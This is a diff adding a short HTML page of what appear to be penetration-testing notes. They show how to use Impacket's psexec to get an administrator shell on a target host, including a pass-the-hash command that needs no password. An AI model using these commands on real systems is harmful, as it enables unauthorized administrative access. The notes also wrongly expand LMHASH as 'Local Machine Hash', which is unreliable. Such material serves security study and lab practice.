@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>psexec</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>psexec</h1><br/><p><strong>PSEXEC</strong> - Used to login as Administrator (Note: May require samba)</p><p></p><p><strong>If We have admin credentials we can directly open a shell from Impacket kit:</strong></p><p></p><p>impacket-psexec.py administrator@{TARGET_IP}</p><p>or</p><p>python3 psexec.py administrator@{TARGET_IP}</p><p></p><p><img src="images/154-1.png" alt="images/154-1.png" /></p><p></p><p></p><p></p><p></p><p><strong><span style="text-decoration:underline;">We can also do “Pass the Hash” attack with psexec</span></strong></p><p>(No Password Required: Only Hash required)</p><p></p><p>format:</p><p><em>impacket-psexec administrator@&lt;IP_Address&gt; -hashes LMHASH:NTHASH</em></p><p></p><p>LMHASH - Local Machine Hash</p><p>NTHASH - User Hash</p><p></p><p></p><p><img src="images/154-2.png" alt="images/154-2.png" /></p></div>
+</body>
+</html>
